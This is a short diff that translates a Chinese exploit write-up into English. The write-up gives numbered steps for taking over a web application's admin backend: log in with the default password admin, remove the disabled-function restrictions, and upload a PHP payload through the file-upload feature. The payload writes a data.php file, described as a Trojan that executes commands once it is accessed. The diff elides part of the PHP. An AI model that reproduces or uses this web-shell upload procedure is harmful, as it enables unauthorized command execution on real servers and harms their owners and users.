@@ -1,8 +1,6 @@
-1、使用默认帐号密码admin登入后台，目前最新版本（2023年8月15日）：
-
-2、将系统禁用函数删除：
-
-3、文件上传处上传payload：
+1. Use the default account password admin to log in to the backend. Currently, the latest version (August 15, 2023)
+2. To remove system disabled functions
+3. Upload Payload at the file upload location:
 ```php
 <?php
 $fp=fopen('data.php','w');
@@ -16,8 +14,9 @@ echo 'ok';
 ?>
 ```
 
-4、访问payload
+4. Accessing Payload
+5. A Trojan file will be generated in the directory to access executable commands
 
-5、目录下会生成木马文件，访问可执行命令
+
 
 
